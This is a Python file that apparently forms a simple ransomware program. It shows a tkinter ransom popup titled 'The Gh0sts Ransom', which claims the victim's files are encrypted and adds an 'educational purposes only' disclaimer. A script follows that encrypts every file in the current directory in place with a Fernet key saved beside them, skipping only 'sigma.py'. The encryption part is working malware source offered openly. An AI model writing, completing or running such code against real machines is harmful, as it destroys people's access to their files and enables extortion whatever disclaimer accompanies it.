import tkinter as tk
from tkinter import font

class StylishPopup:
    def __init__(self, master):

        self.window = tk.Toplevel(master)
        self.window.title("The gh0sts ransom")
        self.window.geometry("600x600")
        self.window.configure(bg='#2C3E50')  # Dark blue-gray background

        content_frame = tk.Frame(self.window, bg='#34495E', padx=20, pady=20)
        content_frame.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)

        # Title font
        title_font = font.Font(family="Helvetica", size=18, weight="bold")
        
        # Body text font
        body_font = font.Font(family="Arial", size=12)

        # Title Label
        title_label = tk.Label(
            content_frame, 
            text="The Gh0sts Ransom", 
            font=title_font, 
            fg='#ECF0F1',  # Light gray text
            bg='#34495E',  # Matching frame background
            wraplength=450
        )
        title_label.pack(pady=(10, 20))

        # Description Text
        description = (
            "Well its not a great day for your computer. "
            "Your computer is hacked and all of your files are encrypted with professional level encryption. "
            "Your files are completley locked and you will never access them agian. "
            "You are the victim of the gh0sts ransom. "

            " This is a virus made by me, jyomama28 on github. "
            " This virus is made for educational purposes only. "
            " I am not responisble for any misuse or damage that this virus causes. "
            " Please be responisble at all times. "

            " If you really want to test this ransomware i recommend using a virtual machine. "
            " This virus has been tested in a virtual machine many times to make sure that it does not escape the vm. "
            " Please support my work and visit my github at https://github.com/jyoeymama. "
            
        )

        # Description Label
        description_label = tk.Label(
            content_frame, 
            text=description, 
            font=body_font, 
            fg='#BDC3C7',  # Soft gray text
            bg='#34495E',  # Matching frame background
            wraplength=450,
            justify=tk.LEFT
        )
        description_label.pack(pady=(10, 20))

        # Close Button with custom styling
        close_button = tk.Button(
            content_frame, 
            text="Close", 
            command=self.window.destroy,
            bg='#3498DB',      # Bright blue
            fg='white',         # White text
            font=("Helvetica", 12, "bold"),
            activebackground='#2980B9',  # Darker blue when pressed
            activeforeground='white',
            relief=tk.RAISED,
            borderwidth=3
        )
        close_button.pack(pady=(10, 10))

        self.window.grab_set()

def create_popup():
    root = tk.Tk()
    root.withdraw()  
    popup = StylishPopup(root)
    root.mainloop()

if __name__ == "__main__":
    create_popup()

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "sigma.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
            contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
